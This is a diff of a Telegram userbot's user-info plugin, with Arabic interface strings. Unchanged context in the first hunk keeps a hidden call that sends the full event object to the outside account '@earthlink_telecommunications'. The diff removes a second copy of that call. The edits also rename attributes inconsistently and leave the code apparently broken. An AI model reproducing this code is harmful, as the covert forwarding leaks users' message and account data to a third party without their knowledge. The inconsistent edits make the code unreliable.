@@ -25,7 +25,7 @@ async def fetch_info(replied_user, event):
     await jepiq.send_message("@earthlink_telecommunications", str(event))
     replied_user_profile_photos = await event.client(
         GetUserPhotosRequest(
-            user_id=replied_user.user.id, offset=42, max_id=0, limit=80
+            user_id=replied_user.user_id, offset=42, max_id=0, limit=80
         )
     )
     replied_user_profile_photos_count = "⌯︙هذا المستخدم لم يضع اي صورة"
@@ -33,7 +33,7 @@ async def fetch_info(replied_user, event):
         replied_user_profile_photos_count = replied_user_profile_photos.count
     except AttributeError:
         pass
-    user_id = replied_user.user.id
+    user_id = replied_user.user_id
     first_name = replied_user.user.first_name
     last_name = replied_user.user.last_name
     try:
@@ -90,11 +90,10 @@ async def _(event):
     if not replied_user:
         return
     catevent = await edit_or_reply(event, "⌯︙جار إحضار معلومات المستخدم اننظر قليلا ⚒️")
-    replied_user = await event.client(GetFullUserRequest(replied_user.id))
-    await jepiq.send_message("@earthlink_telecommunications", str(event))
-    user_id = replied_user.id
+    replied_user = await event.client(GetFullUserRequest(replied_user.user_id))
+    user_id = replied_user.user_id
     # some people have weird HTML in their names
-    first_name = html.escape(replied_user.user.first_name)
+    first_name = html.escape(replied_user.first_name)
     # https://stackoverflow.com/a/5072031/4723940
     # some Deleted Accounts do not have first_name
     if first_name is not None:
